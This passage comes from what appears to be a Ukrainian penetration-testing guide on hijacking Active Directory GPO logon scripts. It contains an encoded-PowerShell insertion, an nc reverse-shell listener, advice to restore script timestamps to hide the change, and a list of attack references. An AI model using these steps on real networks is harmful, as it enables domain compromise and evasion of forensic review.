cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Запустіть прослуховування на своєму хості й очікуйте на наступний інтерактивний вхід:

```bash
rlwrap -cAr nc -lnvp 443
```

Примітки:
- Виконання відбувається з токеном користувача, від імені якого виконується журналювання (не SYSTEM). Область дії — посилання GPO (OU, сайт, домен), до якого застосовується цей скрипт.
- Після використання відновіть початковий вміст і часові мітки.


## References

- [1] [Зловживання ACL/ACE Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Привілейовані облікові записи та привілеї токенів](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 — оновлення шляхів атаки ACL](https://wald0.com/?p=112)
- [4] [Перелік ActiveDirectoryRights — Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Підвищення привілеїв за допомогою ACL в Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Сканування привілеїв Active Directory та привілейованих облікових записів](https://adsecurity.org/?p=3658)
- [7] [Конструктор ActiveDirectoryAccessRule — Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD — операції з атрибутами AD/UAC у Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba — net rpc (членство в групі)](https://www.samba.org/)
- [10] [HTB Puppy: зловживання ACL AD, злам Argon2 у KeePassXC і розшифрування DPAPI для отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec — ARP навколо й дізнайся: перехоплення UNC-шляхів GPO для виконання коду та NTLM relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: експлуатація GPO Active Directory через NTLM relay та інше](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU — смієтеся? — Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: експлуатація прихованих векторів атак ACL організаційних підрозділів в Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Імітація легітимних служб Active Directory у мережі: випадок експлуатації GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — переміщення між OU та зловживання успадкованими ACL](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
